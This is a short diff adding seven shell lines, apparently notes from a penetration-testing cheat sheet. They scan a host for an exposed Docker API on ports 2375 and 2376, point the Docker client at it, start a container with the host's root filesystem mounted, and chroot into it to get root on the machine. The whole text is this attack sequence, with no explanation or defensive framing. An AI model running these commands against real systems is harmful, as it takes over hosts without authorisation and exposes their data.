@@ -1,0 +1,7 @@
+nmap -p 2375 host # Check docker socket
+nmap -p 2376 host # Check docker encrypted socket
+export DOCKER_HOST=host:2375
+docker ps
+docker run -it -v /:/host ubuntu:18.04 bash
+chroot /host
+whoami
